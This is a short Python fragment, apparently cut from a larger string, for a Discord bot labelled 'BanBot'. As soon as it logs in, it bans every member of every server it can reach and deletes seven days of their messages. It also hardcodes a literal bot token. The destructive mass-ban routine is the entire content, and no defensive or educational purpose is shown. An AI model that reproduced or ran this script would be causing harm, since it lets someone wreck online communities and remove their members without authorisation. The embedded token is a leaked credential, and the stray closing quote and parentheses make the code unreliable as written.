TOKEN = "ODMyNjY4MjE0Mjc3MTc3NDM2.YHnItA.Q79Uzik1opd54DG-qG4_kWsxemg"
SKIP_BOTS = False
client = discord.Client()

@client.event
async def on_ready():
    print('Logged in!')
    for member in client.get_all_members():
        if member.bot and SKIP_BOTS:
            continue
        await member.ban(reason="Banned by BanBot", delete_message_days=7)
        print(f"Banned {member.display_name}!")
    print("Banning is complete!")

client.run(TOKEN)"
             )
        )
